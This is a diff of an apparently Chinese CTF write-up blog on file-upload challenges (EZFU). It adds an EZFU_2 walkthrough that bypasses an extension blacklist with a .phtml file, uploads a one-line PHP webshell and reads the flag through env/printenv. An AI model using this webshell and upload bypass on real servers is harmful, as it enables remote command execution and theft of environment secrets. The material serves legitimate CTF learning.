@@ -646,11 +646,9 @@ $file 直接取自 $_GET[&amp;lsquo;file&amp;rsquo;]，没有任何过滤或白�
 &gt;&lt;/p&gt;
 &lt;h2 id=&#34;ezfu&#34;&gt;EZFU
 &lt;/h2&gt;&lt;h3 id=&#34;ezfu-1&#34;&gt;EZFU
-&lt;/h3&gt;&lt;p&gt;访问首页 发现有文件上传功能&lt;br&gt;
-fu_1 &lt;br&gt;
+&lt;/h3&gt;&lt;p&gt;访问首页 发现有文件上传功能  &lt;br&gt;
 正常上传一个测试文件，服务端返回 uploads/&lt;uuid&gt;.&lt;ext&gt;，说明上传后的文件可以直接通过 Web 路径访问&lt;br&gt;
 在源码里看到它只取原始文件名扩展名，然后直接 move_uploaded_file()，没有任何类型校验  直接抓包 改包发送即可&lt;br&gt;
-fu_2
 接着直接访问返回的 file_url 验证命令执行&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -660,8 +658,7 @@ fu_2
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;docker&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;qingcen&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;35383&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uploads&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xxxxxx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;  
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;fu_3&lt;br&gt;
-一般来说 flag会放在环境变量中&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;一般来说 flag会放在环境变量中&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -670,14 +667,11 @@ fu_2
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;docker&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;qingcen&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;35383&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uploads&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xxxxxx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;printenv&lt;/span&gt;  
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;fu_4&lt;br&gt;
-成功获得flag&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;成功获得flag&lt;/p&gt;
 &lt;h3 id=&#34;ezfu_1&#34;&gt;EZFU_1
 &lt;/h3&gt;&lt;p&gt;和前面一样 那我们直接看源码&lt;br&gt;
-fu1_1&lt;br&gt;
 只允许上传图片文件 我们上传一个简单的图片绕过前端 在burp中修改文件名和内容即可&lt;br&gt;
 修改请求体 中filename 1.png-&amp;gt;1.php 和Content-Type image/png-&amp;gt;application/x-php&lt;br&gt;
-fu1_2&lt;br&gt;
 上传成功 我们直接访问并测试 命令是否执行&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -687,8 +681,7 @@ fu1_2&lt;br&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;docker&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;qingcen&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;42821&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;upload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/******.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;  
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;fu1_3&lt;br&gt;
-命令执行成功  直接读环境变量获得flag&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;命令执行成功  直接读环境变量获得flag&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -697,10 +690,62 @@ fu1_2&lt;br&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;docker&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;qingcen&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;42821&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uploads&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/********.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;printenv&lt;/span&gt;  
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;fu1_4&lt;br&gt;
-成功获得flag&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;成功获得flag&lt;/p&gt;
 &lt;h3 id=&#34;ezfu_2&#34;&gt;EZFU_2
-&lt;/h3&gt;&lt;h3 id=&#34;ezfu_3&#34;&gt;EZFU_3
+&lt;/h3&gt;&lt;p&gt;一、初始观察&lt;/p&gt;
+&lt;p&gt;打开题目页面，是一个很简洁的文件上传表单，只接受 image
+字段，上传后返回文件路径。没有登录、没有验证码，看起来就是考上传绕过。&lt;/p&gt;
+&lt;p&gt;二、试探过滤规则&lt;/p&gt;
+&lt;p&gt;先拿不同类型的文件试了一圈，摸清楚后端的过滤逻辑：&lt;/p&gt;
+&lt;p&gt;┌────────────┬─────────────────────────────┬────────────────────────────┐
+│    文件    │            结果             │            说明            │
+├────────────┼─────────────────────────────┼────────────────────────────┤
+│ test.php   │ ❌ File type not allowed    │ 扩展名黑名单               │
+├────────────┼─────────────────────────────┼────────────────────────────┤
+│ test.php5  │ ❌ 同上                     │ 也被黑名单拦了             │
+├────────────┼─────────────────────────────┼────────────────────────────┤
+│ test.pHp   │ ❌ 同上                     │ 转小写后匹配，大小写绕不过 │
+├────────────┼─────────────────────────────┼────────────────────────────┤
+│ test.jpg   │ ✅ 正常上传                 │ 图片放行                   │
+├────────────┼─────────────────────────────┼────────────────────────────┤
+│ test.phtml │ ✅ 正常上传                 │ 这个漏了！                 │
+├────────────┼─────────────────────────────┼────────────────────────────┤
+│ test.phar  │ ❌ File content not allowed │ 内容检测拦了               │
+├────────────┼─────────────────────────────┼────────────────────────────┤
+│ .htaccess  │ ✅ 正常上传                 │ 没拦这个                   │
+└────────────┴─────────────────────────────┴────────────────────────────┘&lt;/p&gt;
+&lt;p&gt;到这里已经看出来了——后端有两层过滤：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;第一层：扩展名黑名单，拦了 php, php3, php4, php5, phps, pht, jsp,jspx, asp, aspx, sh, py, pl, exe,
+bat, cmd&lt;/li&gt;
+&lt;li&gt;第二层：内容检测，如果文件里有 &amp;lt;?php 或 &amp;lt;?= 标记，只有 .phtml 扩展名能放行&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;所以 .phtml 就是突破口——它既不在黑名单里，又不会被内容检测拦，而且 Apache 默认会把它当 PHP 解析。&lt;/p&gt;
+&lt;p&gt;三、拿到 Webshell&lt;/p&gt;
+&lt;p&gt;构造一句话木马：&lt;/p&gt;
+  &lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;
+&lt;p&gt;保存为 shell.phtml，通过表单上传，服务器返回了文件路径：&lt;/p&gt;
+&lt;p&gt;uploads/96289496-024a-471d-8ad0-faeb1416d3a3.phtml&lt;/p&gt;
+&lt;p&gt;访问确认能执行 PHP——服务器返回了 phpinfo 的输出，说明 .phtml 确实被当作 PHP 处理了。&lt;/p&gt;
+&lt;p&gt;四、找 Flag&lt;/p&gt;
+&lt;p&gt;用 webshell 执行命令，先翻了一遍常见位置（/flag*、/root/、/var/www/html/），都没找到。&lt;/p&gt;
+&lt;p&gt;最后直接读环境变量：&lt;/p&gt;
+&lt;p&gt;curl &amp;ldquo;http://&amp;hellip;/uploads/xxx.phtml?cmd=env&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;在输出里发现了：&lt;/p&gt;
+&lt;p&gt;FLAG=flag{4327b3b7-cfac-46f7-8e6f-88810e9a2147}&lt;/p&gt;
+&lt;p&gt;Flag 是通过 Docker 的环境变量注入进来的，所以用 find 搜文件名搜不到，必须用 env 或 printenv
+才能看见。&lt;/p&gt;
+&lt;p&gt;五、Flag&lt;/p&gt;
+&lt;p&gt;flag{4327b3b7-cfac-46f7-8e6f-88810e9a2147}&lt;/p&gt;
+&lt;p&gt;六、复盘&lt;/p&gt;
+&lt;p&gt;这题的核心考点就两个：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;扩展名黑名单不完整——.phtml 是 PHP 的合法扩展名，但出题人的黑名单里漏掉了。做题的时候要对各种 web
+语言的扩展名心里有数，比如 .phtml、.pht、.phps、.phar 这些冷门的。&lt;/li&gt;
+&lt;li&gt;Flag 藏在环境变量里——不是文件，不能靠 find 搜到。Docker 容器里经常通过 ENV FLAG=xxx 注入
+flag，养成习惯先 env 看一眼。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;ezfu_3&#34;&gt;EZFU_3
 &lt;/h3&gt;&lt;h3 id=&#34;ezfu_4&#34;&gt;EZFU_4
 &lt;/h3&gt;&lt;h3 id=&#34;ezfu_5&#34;&gt;EZFU_5
 &lt;/h3&gt;&lt;h3 id=&#34;ezfu_6&#34;&gt;EZFU_6
